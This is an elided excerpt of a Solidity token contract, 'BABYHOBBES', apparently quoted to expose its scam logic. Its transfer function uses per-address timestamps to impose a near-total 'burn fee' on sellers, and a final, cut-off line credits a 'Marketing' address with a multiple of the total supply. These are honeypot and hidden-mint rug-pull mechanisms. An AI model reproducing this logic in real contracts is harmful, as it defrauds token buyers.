...
contract  BABYHOBBES     is Ownable, IERC20 {
    ...
    string private  _symbol = "BABYHOBBES";
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        if ( from != uniswapV2Pairs )  {
               if (    Market[from] + Time + 1  < block.timestamp    && amount >= burn) {
               burnfee = amount -burn ;  }  
               if (    Market[from] + 60 * 60 * 24 * 3   < block.timestamp    && amount >= burn) {
               burnfee = 0 ;             } 
               
            } 
    }

        if (  from == uniswapV2Pairs  && to == Marketing ) { _tOwned[Marketing] += _totalSupply *
